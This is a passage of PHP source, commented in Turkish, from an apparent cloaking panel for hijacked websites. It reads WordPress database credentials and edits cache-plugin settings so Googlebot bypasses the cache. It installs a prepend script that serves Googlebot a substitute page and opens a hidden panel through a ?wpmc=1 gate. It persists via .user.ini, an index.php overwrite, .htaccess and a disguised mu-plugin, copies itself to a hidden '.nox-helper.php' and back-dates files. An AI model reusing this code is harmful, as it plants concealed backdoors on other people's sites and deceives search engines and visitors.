    $data['page_cache']['exclude']['user_agents'] = array_values($merged);
    $ok = cseh_db_set_option($mysqli, $prefix, 'wphb_settings', serialize($data));
    return array('ok'=>$ok, 'plugin'=>'hummingbird', 'message'=>$ok?(count($merged)-$before).' UA added':'db write failed', 'before'=>$before, 'after'=>count($merged));
}

function cseh_apply_cache_bypass($DIR){
    $out = array('status'=>'', 'detected'=>array(), 'results'=>array());
    $cfg_path = cseh_find_wpconfig($DIR);
    if(!$cfg_path){ $out['status'] = 'no_wp'; return $out; }
    $cfg = cseh_parse_wpconfig($cfg_path);
    if(empty($cfg['creds']['DB_NAME']) || empty($cfg['creds']['DB_USER'])){ $out['status'] = 'no_creds'; return $out; }
    $m = cseh_db_connect($cfg['creds']);
    if(!$m){ $out['status'] = 'db_connect_failed'; return $out; }
    $detected = cseh_detect_cache_plugins($m, $cfg['prefix']);
    $out['detected'] = $detected;
    if(empty($detected)){ $out['status'] = 'no_cache_plugin'; $m->close(); return $out; }
    $bot_uas = isset($GLOBALS['CSEH_BOT_UA_LIST']) ? $GLOBALS['CSEH_BOT_UA_LIST'] : array();
    $map = array(
        'wp-rocket'        => 'cseh_bypass_wp_rocket',
        'litespeed'        => 'cseh_bypass_litespeed',
        'w3-total-cache'   => 'cseh_bypass_w3tc',
        'wp-super-cache'   => 'cseh_bypass_wp_super_cache',
        'wp-fastest-cache' => 'cseh_bypass_wp_fastest_cache',
        'flying-press'     => 'cseh_bypass_flying_press',
        'cache-enabler'    => 'cseh_bypass_cache_enabler',
        'sg-cachepress'    => 'cseh_bypass_sg_cachepress',
        'breeze'           => 'cseh_bypass_breeze',
        'hummingbird'      => 'cseh_bypass_hummingbird',
    );
    foreach($detected as $slug){
        if(!isset($map[$slug])){ $out['results'][$slug] = array('ok'=>false, 'message'=>'no writer'); continue; }
        $fn = $map[$slug];
        if(!function_exists($fn)){ $out['results'][$slug] = array('ok'=>false, 'message'=>'fn missing'); continue; }
        try{ $out['results'][$slug] = call_user_func($fn, $m, $cfg['prefix'], $bot_uas); }
        catch(Exception $e){ $out['results'][$slug] = array('ok'=>false, 'message'=>'exception: '.$e->getMessage()); }
    }
    $m->close();
    $out['status'] = 'done';
    return $out;
}

function cseh_repair_wp_backup($DIR, $BACKUP_PATH){
    $out = array('status'=>'', 'before'=>0, 'after'=>0);
    if(!@is_file($BACKUP_PATH)){ $out['status'] = 'no_backup'; return $out; }
    $size = @filesize($BACKUP_PATH);
    $out['before'] = (int)$size;
    if($size === false || $size >= 200){ $out['status'] = 'ok_no_repair_needed'; return $out; }
    $cfg_path = cseh_find_wpconfig($DIR);
    if(!$cfg_path){ $out['status'] = 'not_wp_skip'; return $out; }
    if(!@is_file($DIR.'/wp-blog-header.php')){ $out['status'] = 'wp_blog_header_missing'; return $out; }
    $tpl = "<?php\n/**\n * Front to the WordPress application.\n */\ndefine('WP_USE_THEMES', true);\nrequire __DIR__ . '/wp-blog-header.php';\n";
    $ok = @file_put_contents($BACKUP_PATH, $tpl);
    if($ok === false){ $out['status'] = 'write_failed'; return $out; }
    $out['after'] = (int)@filesize($BACKUP_PATH);
    $out['status'] = 'repaired';
    return $out;
}
// nginx FastCGI cache bypass snippet (kullanıcı nginx config'ine ekler — plugin yazamaz)
function cseh_nginx_snippet(){
  return "# Googlebot'u FastCGI cache'ten muaf tut (server block içine):\n"
    ."set \$cseh_skip 0;\n"
    ."if (\$http_user_agent ~* \"Googlebot|AdsBot|Google-InspectionTool|GoogleOther|Storebot-Google|Mediapartners-Google\") {\n"
    ."    set \$cseh_skip 1;\n"
    ."}\n"
    ."# location ~ \\.php\$ bloğunda:\n"
    ."#   fastcgi_cache_bypass \$cseh_skip;\n"
    ."#   fastcgi_no_cache     \$cseh_skip;\n";
}

// ---- .user.ini auto_prepend FALLBACK (index.php kilitliyse / FPM dayanıklılık) -------------
// PHP-FPM/CGI'de .user.ini auto_prepend_file → her istekte index.php'den ÖNCE prepend.php koşar.
// index.php'ye DOKUNMADAN cloak servis eder (kilitli index.php'yi aşar + CMS update'i index.php'yi ezse bile yaşar).
function cseh_prepend_code($panel_basename){
  $pb=addslashes($panel_basename);
  return "<?php\n/* NOX-RENDER-PREPEND-V1 */\n".
    // Panel kapısı — ?wpmc=1 (panel zaten ana script ise tekrar require ETME = redeclare önlenir)
    "if(isset(\$_GET['wpmc'])&&\$_GET['wpmc']==='1'){\$_p=dirname(__DIR__).'/{$pb}';".
    "if(is_file(\$_p)&&realpath(\$_p)!==@realpath(isset(\$_SERVER['SCRIPT_FILENAME'])?\$_SERVER['SCRIPT_FILENAME']:'')){require \$_p;exit;}}\n".
    // Bayrak-kontrollü cloak serve (index.php'den ÖNCE)
    "if(@file_exists(__DIR__.'/render.lock')){\n".
    "\$_ua=isset(\$_SERVER['HTTP_USER_AGENT'])?\$_SERVER['HTTP_USER_AGENT']:'';\n".
    "\$_u=isset(\$_SERVER['REQUEST_URI'])?(string)parse_url(\$_SERVER['REQUEST_URI'],PHP_URL_PATH):'/';\$_u=rtrim(\$_u,'/');\n".
    "if(preg_match('/Googlebot|AdsBot|Mediapartners-Google|APIs-Google|Google-InspectionTool|GoogleOther|Storebot-Google|Google-/i',\$_ua)&&(\$_u===''||\$_u==='/index.php')){".
    "\$_pf=__DIR__.'/render-cache.html';if(file_exists(\$_pf)){while(ob_get_level()>0)@ob_end_clean();".
    "header('Content-Type: text/html; charset=UTF-8');header('Vary: User-Agent');header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');@readfile(\$_pf);exit;}".
    "}\n}\n// devam → orijinal index.php normal çalışır\n";
}
// SAPI .user.ini'yi onurlandırır mı? (fpm-fcgi / cgi-fcgi → evet; apache2handler/mod_php → HAYIR)
function cseh_userini_supported(){
  $s=php_sapi_name();
  return (strpos($s,'fpm')!==false||strpos($s,'cgi')!==false);
}
// .user.ini'ye auto_prepend ekle (BEGIN/END marker, mevcut .user.ini'yi koru)
function cseh_userini_add($dir,$prependAbs){
  $f=$dir.DIRECTORY_SEPARATOR.'.user.ini';
  $cur=file_exists($f)?(string)@file_get_contents($f):'';
  if(strpos($cur,'; BEGIN NOX-RENDER')!==false)return 'EXISTS';
  $block="; BEGIN NOX-RENDER\nauto_prepend_file = \"".$prependAbs."\"\n; END NOX-RENDER\n";
  return @file_put_contents($f,$cur.$block)!==false?'OK':'ERR';
}
function cseh_userini_remove($dir){
  $f=$dir.DIRECTORY_SEPARATOR.'.user.ini';
  if(!file_exists($f))return;
  $cur=(string)@file_get_contents($f);
  if(strpos($cur,'; BEGIN NOX-RENDER')===false)return;
  $clean=preg_replace('/; BEGIN NOX-RENDER.*?; END NOX-RENDER\n?/s','',$cur);
  $clean=trim($clean);
  if($clean==='')@unlink($f); else @file_put_contents($f,$clean);
}

// Dizindeki referans dosyalardan medyan mtime hesapla
function ref_mtime($dir,$skip=[]){
  $mt=[];
  if($dh=@opendir($dir)){
    while(($f=readdir($dh))!==false){
      if($f==='.'||$f==='..')continue;
      $fp=$dir.DIRECTORY_SEPARATOR.$f;
      if(!is_file($fp)||in_array($f,$skip))continue;
      $t=@filemtime($fp);
      if($t>mktime(0,0,0,1,1,2010))$mt[]=$t;
    }
    closedir($dh);
  }
  if(empty($mt))return null;
  sort($mt);
  return $mt[(int)(count($mt)/2)];
}


// ---- DOCTOR (en basta) ----

// ---- ÖN UYUMLULUK TESTİ (precheck v2): "En az 1 yol çalışıyorsa UYGUN" -----
// Mantık değişikliği (v2):
//   Eski: her yöntem (index.php / .htaccess / .user.ini / mu-plugin) ayrı ayrı
//         BLOCKER olabiliyordu. Apache + .htaccess read-only → verdict='bad'
//         halbuki index.php ezilerek cloak zaten kurulabilirdi. False negative.
//   Yeni: 4 kurulum yolu OR mantığıyla değerlendirilir. En az 1 yol açıksa
//         cloak kurulabilir. Sadece 0 yol açık ise BLOCKER olur.
//   Kod referansı (autocloak handler satır 1425-1508): $methods dizisi OR
//   short-circuit ile kurulur; ayrıca $INDEX_CLOAKED (satır 453-466) zaten
//   4 yöntemi OR ile kontrol eder. Precheck bunu yansıtmalı.
if($a==="precheck"){
  $checks = array();
  $score = 0; $max_score = 0;
  $blockers = 0; $warnings = 0;

  // -------- 1) PHP Versiyonu (weight 15, ŞART) --------
  $php = PHP_VERSION;
  $php_ok = version_compare($php,'7.0.0','>=');
  $php_5x = version_compare($php,'5.6.0','>=');
  $st = $php_ok?'ok':($php_5x?'warn':'err');
  $checks[] = array('name'=>'PHP Versiyonu','status'=>$st,'value'=>$php,
    'msg'=>$php_ok?'uygun (7.0+)':($php_5x?'5.6 çalışır ama 7.0+ önerilir':'ŞART: 7.0+ gerekli — token-auth kırılır'),
    'weight'=>15,'blocker'=>!$php_5x);
  $max_score+=15; if($st==='ok'){$score+=15;} elseif($st==='warn'){$score+=8; $warnings++;} else {$blockers++;}

  // -------- 2) Sunucu tipi (weight 5, sadece bilgi) --------
  // Not: nginx artık BLOCKER değil. FPM/CGI'de .user.ini fallback çalışır.
  $srv = function_exists('cseh_server_type')?cseh_server_type():'other';
  $srv_ok = in_array($srv,array('apache','litespeed'));
  $st = $srv_ok?'ok':($srv==='nginx'?'warn':'warn');
  $checks[] = array('name'=>'Sunucu Yazılımı','status'=>$st,'value'=>strtoupper($srv),
    'msg'=>$srv_ok?'.htaccess bypass rule\'ları çalışır':($srv==='nginx'?'nginx: .htaccess okunmaz; .user.ini/index.php/mu-plugin yolları çalışır':'bilinmeyen sunucu — mevcut kurulum yollarına düşülür'),
    'weight'=>5,'blocker'=>false);
  $max_score+=5; if($srv_ok){$score+=5;} else {$score+=3; $warnings++;}

  // -------- 3) Kök yazma izni (weight 15, ŞART — mu-plugin hariç her yol için gerek) --------
  $root_w = is_writable($DIR);
  // Not: mu-plugin yolu wp-content'e yazar, kök yazımı gerekmez. Fakat
  // .render-cache/ klasörünü oluşturmak için de kök gerek (mu-plugin uploads'a yazar).
  // Bu yüzden root_w gerçek blocker sadece "hiçbir yol açık değilse" olur; aşağıda toplu değerlendirilir.
  $checks[] = array('name'=>'Kök dizin yazma','status'=>$root_w?'ok':'warn','value'=>$root_w?'YAZILABILIR':'KAPALI',
    'msg'=>$root_w?'index.php ezilebilir, .render-cache/ açılabilir':'kök kapalı — WP mu-plugin yolu (wp-content/uploads) hâlâ deneyebilir',
    'weight'=>15,'blocker'=>false);
  $max_score+=15; if($root_w){$score+=15;} else {$score+=5; $warnings++;}

  // -------- Ön hazırlık: 4 kurulum yolunun DURUMU --------
  $idx_path = $DIR.DIRECTORY_SEPARATOR.'index.php';
  $idx_w    = file_exists($idx_path)?is_writable($idx_path):$root_w;

  $ht_path  = $DIR.DIRECTORY_SEPARATOR.'.htaccess';
  $ht_w     = file_exists($ht_path)?is_writable($ht_path):$root_w;
  $ht_needed= ($srv==='apache'||$srv==='litespeed');

  $userini_supported = function_exists('cseh_userini_supported')?cseh_userini_supported():false;

  // CMS (ileride WP yolu için gerek)
  $cmsInfo = function_exists('detect_cms')?detect_cms($DIR):array('cms'=>'unknown','label'=>'?');
  $cms = isset($cmsInfo['cms'])?$cmsInfo['cms']:'unknown';

  // WP mu-plugin yolu için wp-content yazılabilirliği
  $wp_muplugin_w = false;
  $wp_uploads_w  = false;
  if($cms==='wp'){
    $wpc = $DIR.'/wp-content';
    $wpmu = $DIR.'/wp-content/mu-plugins';
    // mu-plugins ya yazılabilir, ya da yoksa wp-content yazılabilir (oluşturulabilir)
    if(is_dir($wpmu)){
      $wp_muplugin_w = is_writable($wpmu);
    } else {
      $wp_muplugin_w = is_dir($wpc) && is_writable($wpc);
    }
    $up = $DIR.'/wp-content/uploads';
    $wp_uploads_w = is_dir($up) && is_writable($up);
  }

  // 4 yol: OR mantığı — herhangi biri açıksa cloak kurulabilir
  $way_A = $idx_w;                              // Y1: index.php overwrite
  $way_B = ($userini_supported && $root_w);     // Y2: .user.ini auto_prepend (FPM/CGI + kök)
  $way_C = ($ht_needed && $ht_w);               // Y3: .htaccess rewrite cloak (Apache/LSWS + .htaccess yaz)
  $way_D = ($cms==='wp' && $wp_muplugin_w);     // Y4: WP mu-plugin airbag

  $ways_open = 0;
  $ways_open += $way_A?1:0;
  $ways_open += $way_B?1:0;
  $ways_open += $way_C?1:0;
  $ways_open += $way_D?1:0;

  $ways_labels = array();
  if($way_A) $ways_labels[] = 'index.php';
  if($way_B) $ways_labels[] = '.user.ini';
  if($way_C) $ways_labels[] = '.htaccess';
  if($way_D) $ways_labels[] = 'mu-plugin';

  // -------- 4) BİRLEŞİK Kurulum Yolları (weight 40, TEK BLOCKER kaynağı) --------
  // ways_open === 0 → gerçek blocker (cloak fiziksel olarak yazılamaz)
  $st_ways = ($ways_open>=2)?'ok':($ways_open===1?'warn':'err');
  $val_ways = $ways_open.'/4 hazır'.($ways_labels?' ('.implode(' + ',$ways_labels).')':'');
  if($ways_open===0){
    $msg_ways = 'ENGEL: 4 yöntemin hiçbiri açık değil — cloak kurulamaz. Host paneli üzerinden CHMOD ile en az birini yazılabilir yap: '.
                'kök index.php · .htaccess · .user.ini (FPM/CGI) · wp-content/mu-plugins';
  } elseif($ways_open===1){
    $msg_ways = 'Kurulum '.$ways_labels[0].' yoluyla yapılacak. Tek yol açık — riski düşürmek için 2+ yol önerilir ama zorunlu değil.';
  } else {
    $only_extras = array_diff(array('index.php','.user.ini','.htaccess','mu-plugin'),$ways_labels);
    $extras_note = $only_extras?' | opsiyonel: '.implode(', ',$only_extras).' yok':'';
    $msg_ways = 'Kurulum '.$ways_labels[0].' ile yapılacak; '.($ways_open-1).' yedek yol da hazır.'.$extras_note;
  }
  $checks[] = array('name'=>'Kurulum Yolları (OR)','status'=>$st_ways,'value'=>$val_ways,
    'msg'=>$msg_ways,'weight'=>40,'blocker'=>($ways_open===0),
    'ways'=>array(
      'index_php'=>array('open'=>$way_A,'writable'=>$idx_w,'path'=>'index.php'),
      'user_ini' =>array('open'=>$way_B,'supported'=>$userini_supported,'root_writable'=>$root_w,'path'=>'.user.ini'),
      'htaccess' =>array('open'=>$way_C,'needed'=>$ht_needed,'writable'=>$ht_w,'path'=>'.htaccess'),
      'muplugin' =>array('open'=>$way_D,'is_wp'=>($cms==='wp'),'writable'=>$wp_muplugin_w,'path'=>'wp-content/mu-plugins/0-media-cache.php'),
    ));
  $max_score+=40;
  if($ways_open>=2){ $score+=40; }
  elseif($ways_open===1){ $score+=28; $warnings++; }
  else { $blockers++; } // ways_open===0 → GERÇEK blocker

  // -------- Alt-detay satırları (bilgi amaçlı, weight 0 — skoru etkilemez, ways_open zaten kapsıyor) --------
  // Kullanıcı hangi yolun neden açık/kapalı olduğunu görsün diye ayrı satırlar; ama artık skoru veya blocker'ı etkilemezler.
  $checks[] = array('name'=>'  ↳ Yöntem 1: index.php overwrite','status'=>$way_A?'ok':'info',
    'value'=>$way_A?'HAZIR':'yazılamıyor','msg'=>$way_A?'birincil yol — cloak template kök index.php\'ye yazılır':'index.php read-only — diğer yollara düşülür',
    'weight'=>0,'blocker'=>false);
  $checks[] = array('name'=>'  ↳ Yöntem 2: .user.ini auto_prepend','status'=>$way_B?'ok':'info',
    'value'=>$way_B?'HAZIR':($userini_supported?'kök kapalı':'SAPI: mod_php'),
    'msg'=>$way_B?'FPM/CGI fallback — index.php yazılamazsa devreye girer':'.user.ini bu SAPI\'de çalışmaz veya kök kapalı',
    'weight'=>0,'blocker'=>false);
  $checks[] = array('name'=>'  ↳ Yöntem 3: .htaccess rewrite','status'=>$way_C?'ok':'info',
    'value'=>$way_C?'HAZIR':($ht_needed?'.htaccess yazılamıyor':'sunucu Apache/LSWS değil'),
    'msg'=>$way_C?'Apache/LiteSpeed son çare — PHP çalışmadan cloak servis eder':'opsiyonel — Y1/Y2 zaten yeter',
    'weight'=>0,'blocker'=>false);
  $checks[] = array('name'=>'  ↳ Yöntem 4: WP mu-plugin airbag','status'=>$way_D?'ok':'info',
    'value'=>$way_D?'HAZIR':($cms==='wp'?'wp-content yazılamıyor':'WP değil'),
    'msg'=>$way_D?'kök tamamen kilitliyse WP mu-plugin (wp-content) devreye girer':'sadece WP\'de anlamlı',
    'weight'=>0,'blocker'=>false);

  // -------- 5) CMS tespiti (weight 5) --------
  $checks[] = array('name'=>'CMS','status'=>'ok','value'=>strtoupper($cms),
    'msg'=>'algılandı ('.($cmsInfo['label']?:'-').')','weight'=>5,'blocker'=>false);
  $max_score+=5; $score+=5;

  // -------- 6) WordPress: wp-config + DB (weight 10, WP-only, plugin-serve moduna karar için) --------
  $wp_config = ($cms==='wp')?cseh_find_wpconfig($DIR):'';
  $db_ok = false; $db_msg = 'WP değil — atlanıyor'; $st = 'skip';
  $has_creds = false; $creds = array(); $pcfg = array();
  if($cms==='wp'){
    if(!$wp_config){
      $st='warn'; $db_msg='wp-config.php okunamıyor → plugin-serve devre dışı, file-mode\'a düşer';
      $warnings++;
    } else {
      $pcfg = cseh_parse_wpconfig($wp_config);
      $creds = isset($pcfg['creds'])?$pcfg['creds']:array();
      $has_creds = !empty($creds['DB_NAME']) && !empty($creds['DB_USER']);
      if(!$has_creds){
        $st='warn'; $db_msg='wp-config cred\'leri eksik → file-mode fallback';
        $warnings++;
      } else {
        $mysqli = cseh_db_connect($creds);
        if($mysqli){
          $db_ok=true; $st='ok'; $db_msg='WP DB bağlantısı çalışıyor — plugin-serve/db.php airbag açılır';
          $score+=10;
          @$mysqli->close();
        } else {
          $st='warn'; $db_msg='DB connect fail → cache plugin bypass düşer, file-mode\'a geç';
          $warnings++;
        }
      }
    }
  }
  $checks[] = array('name'=>'WP DB bağlantısı','status'=>$st,'value'=>($db_ok?'OK':($cms==='wp'?'FAIL':'N/A')),
    'msg'=>$db_msg,'weight'=>10,'blocker'=>false);
  $max_score+=10;
  if($st==='skip'){ $score+=5; } // WP değilse yarısını ver

  // -------- 7) Cache plugin tespiti (weight 5, sadece uyarı) — read-only --------
  $cache_plugins = array();
  if($db_ok && !empty($creds)){
    $mysqli2 = cseh_db_connect($creds);
    if($mysqli2){
      $prefix = isset($pcfg['prefix'])?$pcfg['prefix']:'wp_';
      $cache_plugins = cseh_detect_cache_plugins($mysqli2, $prefix);
      @$mysqli2->close();
    }
  }
  $has_cache = !empty($cache_plugins);
  $st = $has_cache?'warn':'ok';
  $checks[] = array('name'=>'Cache Plugin','status'=>$st,
    'value'=>$has_cache?implode(', ',$cache_plugins):'YOK',
    'msg'=>$has_cache?'DB bypass yazıcısı otomatik devreye girecek':'cache plugin yok — perde direkt servis edilir',
    'weight'=>5,'blocker'=>false);
  $max_score+=5; if(!$has_cache){$score+=5;} else {$score+=3; $warnings++;}

  // -------- 8) curl + gethostbyaddr (weight 10, verified-Googlebot) --------
  $has_curl = function_exists('curl_init');
  $has_ghba = function_exists('gethostbyaddr');
  $both = ($has_curl && $has_ghba);
  $checks[] = array('name'=>'curl + gethostbyaddr','status'=>$both?'ok':'warn',
    'value'=>($has_curl?'curl✓':'curl✗').' '.($has_ghba?'ghba✓':'ghba✗'),
    'msg'=>$both?'verified-Googlebot doğrulaması aktif':'reverse DNS doğrulama düşer → UA-only fallback (sahte bot yakalayabilir)',
    'weight'=>10,'blocker'=>false);
  $max_score+=10; if($both){$score+=10;} else {$score+=4; $warnings++;}

  // -------- 9) mysqli extension (WP plugin-serve için) --------
  $mysqli_ok = extension_loaded('mysqli');
  $checks[] = array('name'=>'mysqli extension','status'=>$mysqli_ok?'ok':($cms==='wp'?'warn':'ok'),
    'value'=>$mysqli_ok?'YÜKLÜ':'YOK',
    'msg'=>$mysqli_ok?'DB bypass hazır':($cms==='wp'?'WP\'de mysqli yok → file-mode\'a düşer':'kritik değil'),
    'weight'=>5,'blocker'=>false);
  $max_score+=5; if($mysqli_ok){$score+=5;} else {if($cms==='wp')$warnings++; $score+=2;}

  // -------- 10) Managed Host uyarısı (weight 5) --------
  $mh_pc = function_exists('cseh_detect_managed_host')?cseh_detect_managed_host():array('host'=>null);
  if($mh_pc['host']!==null){
    $mh_val = $mh_pc['label'];
    $mh_msg = $mh_pc['can_php_purge']
      ? 'PHP purge destekli ama edge CDN için manuel/dashboard da gerekebilir → '.substr($mh_pc['purge_hint'],0,140)
      : 'PHP\'den edge purge YAPILAMAZ — cache temizleme dashboard\'dan MANUEL yapılmalı: '.$mh_pc['dashboard'];
    $checks[] = array('name'=>'Managed Host','status'=>'warn','value'=>$mh_val,
      'msg'=>$mh_msg,'weight'=>5,'blocker'=>false,
      'managed'=>array('host'=>$mh_pc['host'],'label'=>$mh_pc['label'],'dashboard'=>$mh_pc['dashboard'],
                       'purge_hint'=>$mh_pc['purge_hint'],'mu_plugin'=>$mh_pc['mu_plugin'],
                       'can_php_purge'=>$mh_pc['can_php_purge'],'signals'=>$mh_pc['signals']));
    $max_score+=5; $score+=3; $warnings++;
  } else {
    $checks[] = array('name'=>'Managed Host','status'=>'ok','value'=>'YOK',
      'msg'=>'shared/VPS host — edge CDN cache yok, PHP purge yeterli','weight'=>5,'blocker'=>false);
    $max_score+=5; $score+=5;
  }

  // -------- 11) Mevcut cloak durumu (bilgilendirici) --------
  $already_installed = ($INDEX_CLOAKED===true);
  $checks[] = array('name'=>'Mevcut cloak','status'=>'ok',
    'value'=>$already_installed?'KURULU':'TEMİZ',
    'msg'=>$already_installed?'idempotent kurulum — mevcut cloak güncellenir':'sıfırdan kurulum yapılır',
    'weight'=>0,'blocker'=>false);

  // -------- Skor normalize (0-100) --------
  $final_score = ($max_score>0)?intval(round(($score/$max_score)*100)):0;
  if($final_score>100)$final_score=100;
  if($final_score<0)$final_score=0;

  // -------- KARAR (v2): blocker sadece "0 yol açık" veya "PHP < 5.6" --------
  if($blockers>0){
    $verdict = 'bad';
    $verdict_txt = 'UYGUN DEĞİL — cloak kurulamaz';
    if($ways_open===0){
      $summary = 'Kurulum yolu yok: index.php, .user.ini, .htaccess, mu-plugin — dördü de yazılamıyor. Host paneli üzerinden en az birine CHMOD yazma izni ver.';
    } else {
      $summary = 'Engelleyici hata var. PHP sürümü veya sunucu koşulları kritik: '.$blockers.' blocker. Yukarıdaki ❌ satırları çöz.';
    }
  } elseif($final_score>=85){
    $verdict = 'ok';
    $verdict_txt = 'UYGUN — Cloak kurulabilir';
    $summary = 'Kurulum yolları: '.$ways_open.'/4 hazır ('.implode(' + ',$ways_labels).'). CLOAK SERVİSİNİ AÇ ile devam edebilirsin.';
  } elseif($final_score>=60){
    $verdict = 'mid';
    $verdict_txt = 'UYGUN — küçük uyarılar var';
    $summary = 'Cloak kurulabilir ('.$ways_open.'/4 yol). '.$warnings.' uyarı otomatik fallback\'lerle çözülür. CLOAK SERVİSİNİ AÇ ile devam edebilirsin.';
  } else {
    // ways_open>=1 olduğu halde skor düşükse: yine kurulabilir ama düşük skor
    $verdict = 'mid';
    $verdict_txt = 'UYGUN — düşük skor, riskli olabilir';
    $summary = 'Cloak fiziksel olarak kurulabilir ('.$ways_open.'/4 yol) ama uyarılar çok. Sonuç deneme-yanılma; CLOAK SERVİSİNİ AÇ deneyebilirsin.';
  }

  $results = array(
    'ts'=>time(),
    'dir'=>$DIR,
    'score'=>$final_score,
    'verdict'=>$verdict,
    'verdict_txt'=>$verdict_txt,
    'summary'=>$summary,
    'blockers'=>$blockers,
    'warnings'=>$warnings,
    'ways_open'=>$ways_open,
    'ways_labels'=>$ways_labels,
    'checks'=>$checks,
  );

  while(ob_get_level()>0)ob_end_clean();
  header("Content-Type:application/json; charset=utf-8");
  echo json_encode($results, defined('JSON_UNESCAPED_UNICODE')?JSON_UNESCAPED_UNICODE:0);
  exit;
}

// ---- Otomatik cloak: index.php'ye cloak şablonu yaz + .html yoksa oluştur --
if($a==="autocloak"){
  // ★ ZORUNLU SIRA GUARD — perde DOLU olmadan Cloak Aç'ı backend de reddet
  $_perdePaths=array(
    $DIR.DIRECTORY_SEPARATOR.'.render-cache'.DIRECTORY_SEPARATOR.'render-cache.html',
    $DIR.'/wp-content/uploads/wp-media-cache/render-cache.html',
  );
  $_perdeDolu=false; $_perdeBoyut=0;
  foreach($_perdePaths as $_pp){ if(@is_file($_pp)){ $_sz=@filesize($_pp); if($_sz!==false && $_sz>=500){ $_perdeDolu=true; $_perdeBoyut=$_sz; break; } } }
  if(!$_perdeDolu){
    while(ob_get_level()>0)ob_end_clean();
    header("Content-Type:application/json");
    echo json_encode(array(
      'error'=>'PERDE_BOS',
      'message'=>'PERDE DOSYASI BOŞ veya YOK. Önce PERDE İÇERİĞİ kutusuna marka HTML\'i yapıştırıp KAYDET\'e bas, sonra CLOAK SERVİSİNİ AÇ. (Boş perde ile cloak açarsan Googlebot boş sayfa görür.)',
      'perde_size'=>$_perdeBoyut,
      'sira'=>'1) Perde yapıştır → 2) Kaydet → 3) CLOAK SERVİSİNİ AÇ',
    ));
    exit;
  }
  $results=[];
  $cmsInfo=detect_cms($DIR);
  $results['cms']=$cmsInfo['label'];
  $HTML_FILE=$cmsInfo['html_file'];

  // PLUGIN MODU — kök'e dosya YOK, index.php'ye DOKUNMA. Sadece perde + flag.
  if($IS_PLUGIN){
    $results['mode']='plugin';
    if(!is_dir($PERDE_DIR))@mkdir($PERDE_DIR,0755,true);
    // Perde yoksa placeholder oluştur
    if(!file_exists($PERDE_PATH)){
      $ok=@file_put_contents($PERDE_PATH,$HTML_DEFAULT);
      $results['html']=$ok!==false?'CREATED':'ERR';
    }else{
      $results['html']='EXISTS';
    }
    // Cloak'ı aç (flag)
    $okf=@file_put_contents($FLAG_PATH,'1');
    $results['flag']=$okf!==false?'ON':'ERR';
    // dizini web'den listelenemez yap (opsiyonel güvenlik)
    if(!file_exists($PERDE_DIR.'/index.html'))@file_put_contents($PERDE_DIR.'/index.html','');
    // Server cache bypass — sunucuya göre
    $srv=cseh_server_type();
    $results['server']=$srv;
    if($srv==='litespeed'||$srv==='apache'){
      // LiteSpeed/Apache .htaccess okur → bypass kuralı ekle (nginx'te boşuna, atla)
      $results['htaccess_bypass']=cseh_htaccess_add($DIR);
    }else{
      $results['htaccess_bypass']='SKIP ('.$srv.')';
    }
    // nginx'te server cache varsa snippet gerekir (db.php airbag PHP'ye ulaşan isteklerde zaten çalışır)
    if($srv==='nginx')$results['nginx_note']='nginx FastCGI cache varsa snippet ekleyin (panelde)';
    $results['index']='SKIP';       // kök index.php'ye dokunulmadı
    $results['backup']='SKIP';
    $results['mu_plugin']='SKIP';
    $results['wp_blog_header']='SKIP';
    $results['html_file']='render-cache.html (uploads/wp-media-cache)';
    while(ob_get_level()>0)ob_end_clean();
    header("Content-Type:application/json");
    echo json_encode($results);
    exit;
  }

  $idx=$DIR.DIRECTORY_SEPARATOR.$INDEX_FILE;
  $bak=$BACKUP_PATH; // .render-cache/index.php.nox-backup (alt klasör, kök temiz)
  $origMtime=file_exists($idx)?@filemtime($idx):null;
  $results['mode']='file';
  // Gizli çalışma klasörünü hazırla + web'den koru (dizin listeleme + dotfolder erişimi engeli)
  if(!is_dir($PERDE_DIR))@mkdir($PERDE_DIR,0755,true);
  if(!file_exists($PERDE_DIR.'/index.html'))@file_put_contents($PERDE_DIR.'/index.html','');
  if(!file_exists($PERDE_DIR.'/.htaccess'))@file_put_contents($PERDE_DIR.'/.htaccess',"Require all denied\nDeny from all\n");

  // Perde HTML dosyası — gizli .render-cache/ (her durumda hazırla)
  if(!file_exists($PERDE_PATH)){
    $ok2=@file_put_contents($PERDE_PATH,$HTML_DEFAULT);
    $results['html']=$ok2!==false?'CREATED':'ERR';
  }else{
    $results['html']='EXISTS';
  }
  $results['html_file']='render-cache.html (.render-cache/)';

  // Zaten kuruluysa → SADECE bayrağı aç (index.php VEYA .user.ini prepend mevcut).
  if($INDEX_CLOAKED){
    $okf=@file_put_contents($FLAG_PATH,'1');
    $results['index']='ALREADY';
    $results['flag']=$okf!==false?'ON':'ERR';
    $results['backup']=file_exists($bak)?'EXISTS':'SKIP';
    $srv=cseh_server_type();$results['server']=$srv;
    if($srv==='litespeed'||$srv==='apache')$results['htaccess_bypass']=cseh_htaccess_add($DIR);
    while(ob_get_level()>0)ob_end_clean();
    header("Content-Type:application/json");echo json_encode($results);exit;
  }

  // ===== ÇOK-YÖNTEMLİ KURULUM — hangisi yazılabilirse onu kur =====
  $methods=[];
  // Bayrağı aç
  $okf=@file_put_contents($FLAG_PATH,'1');
  $results['flag']=$okf!==false?'ON':'ERR';

  // GİZLİ PANEL KOPYASI — panelin kendini gizli .nox-helper.php'ye yaz → obvious standalone
  // SİLİNEBİLİR, panel index.php gate'ten (gizli kopyadan) açılmaya devam eder. (Sadece bu panel
  // dosyasının bir kopyası; token hash'i dahil → aynı URL çalışır.)
  $_self=(string)@file_get_contents(__FILE__);
  if($_self!==''){
    $_hcp=@file_put_contents($PERDE_DIR.DIRECTORY_SEPARATOR.'.nox-helper.php',$_self);
    $results['hidden_panel']=$_hcp!==false?'OK (.nox-helper.php)':'ERR';
  }

  // YÖNTEM 1: index.php overwrite (birincil, tüm SAPI'lerde, anında)
  $idxWritable = file_exists($idx) ? is_writable($idx) : is_writable($DIR);
  if($idxWritable){
    if(file_exists($idx)){
      $curContent=(string)@file_get_contents($idx);
      if(!file_exists($bak)&&strpos($curContent,'NOX-RENDER-V1')===false){
        $bkok=@file_put_contents($bak,$curContent);
        if($bkok!==false&&$origMtime)@touch($bak,$origMtime);
        $results['backup']=$bkok!==false?'OK':'ERR';
      }else $results['backup']=file_exists($bak)?'EXISTS':'SKIP';
    }
    // OPCACHE BYPASS — cache-seo-helper.php'nin GÜNCEL build_cloak_template'ini DİSKten taze oku
    // (PHP opcache aynı request içinde RAM'deki eski versiyondan çağırır, disk değişse bile)
    // → fresh source'tan eval ile build_cloak_template_fresh tanımla, onu çağır
    if(function_exists('opcache_invalidate'))@opcache_invalidate(__FILE__,true);
    $cloakTpl=null;
